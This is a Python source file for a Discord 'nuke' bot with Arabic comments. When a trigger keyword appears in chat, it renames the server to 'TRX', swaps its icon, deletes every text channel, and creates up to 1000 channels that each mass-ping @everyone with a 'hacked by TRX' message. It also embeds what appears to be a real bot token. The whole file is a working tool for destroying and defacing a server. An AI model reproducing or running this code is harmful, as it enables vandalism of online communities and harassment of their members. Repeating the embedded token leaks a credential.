import discord
from discord.ext import commands
import asyncio
import aiohttp

# التوكن الخاص بك
TOKEN = "MTU0NTQ1MTUyNzEzNTY5OTAxNA.GbN_PU.6fk7Ez72S89P5PR3dqw_NHccGTd4I95Q1eXcwM"

intents = discord.Intents.default()
intents.message_content = True
intents.messages = True

bot = commands.Bot(command_prefix='', intents=intents)

@bot.event
async def on_ready():
    print(f'تم تسجيل الدخول باسم: {bot.user.name}')
    # تغيير صورة السيرفر لتطابق صورة البوت عند البدء (اختياري)
    try:
        avatar_url = bot.user.avatar.url
        # سنقوم بتغيير الصورة لاحقاً عند تفعيل الأمر لضمان العمل
    except AttributeError:
        pass

@bot.event
async def on_message(message):
    # تجاهل رسائل البوت نفسه لتجنب اللوب
    if message.author == bot.user:
        return

    # التحقق من الكلمة المفتاحية
    if '$جحفلهTRX' in message.content:
        print("بدأ هجوم السبام!")
        await spam_attack(message)

async def spam_attack(original_message):
    guild = original_message.guild
    
    if guild is None:
        # إذا كان في الخاص، نستخدم الداتابيس أو نخرج
        print("السيرفر غير موجود (رسالة خاصة)")
        return

    server_name = "TRX"
    
    # 1. تغيير اسم السيرفر
    try:
        await guild.edit(name=server_name)
        print(f"تم تغيير اسم السيرفر إلى: {server_name}")
    except Exception as e:
        print(f"خطأ في تغيير الاسم: {e}")

    # 2. تغيير صورة السيرفر لتكون صورة البوت
    try:
        avatar_url = bot.user.avatar.url
        async with aiohttp.ClientSession() as session:
            async with session.get(avatar_url) as resp:
                if resp.status == 200:
                    image_data = await resp.read()
                    await guild.edit(icon=image_data)
                    print("تم تغيير صورة السيرفر لصورة البوت.")
                else:
                    print("فشل تحميل صورة البوت.")
    except Exception as e:
        print(f"خطأ في تغيير الصورة: {e}")

    # 3. إنشاء 1000 غرفة وحذف القديمة إن وجدت (أو إضافتها)
    # سنحذف الغرف القديمة أولاً لتوفير المساحة ثم ننشئ الجديدة
    channels_to_delete = []
    for channel in guild.text_channels:
        channels_to_delete.append(channel)

    # حذف الغرف القديمة بسرعة
    deleted_count = 0
    for channel in channels_to_delete:
        try:
            await channel.delete()
            deleted_count += 1
            # تجنب الـ Rate Limit كثيراً
            await asyncio.sleep(0.5) 
        except:
            pass
            
    print(f"تم حذف {deleted_count} غرفة قديمة.")

    room_name = "@everyone تم التهكير من قبل ☣️ TRX  ☣️"
    message_content = "@everyone تم التهكير من قبل ☣️ TRX  ☣️ @everyone @here"
    
    created_channels = []
    
    # إنشاء 1000 غرفة
    for i in range(1000):
        try:
            new_channel = await guild.create_text_channel(name=room_name)
            created_channels.append(new_channel)
            
            # إرسال الرسالة داخل الغرفة
            await new_channel.send(message_content)
            
            # تأخير بسيط بين كل غرفة لتجنب الحظر الفوري
            await asyncio.sleep(0.5)
            
            if i % 10 == 0:
                print(f"تم إنشاء {i+1} غرفة...")
                
        except discord.HTTPException as e:
            print(f"خطأ في إنشاء غرفة {i}: {e.reason}")
            break
        except Exception as e:
            print(f"خطأ عام: {e}")
            break

    print(f"اكتمل الهجوم! تم إنشاء {len(created_channels)} غرفة وارسال الرسائل.")

# تشغيل البوت
try:
    bot.run(TOKEN)
except discord.errors.LoginFailure:
    print("التوكن غير صالح أو انتهت صلاحيته.")
except Exception as e:
    print(f"حدث خطأ أثناء التشغيل: {e}")
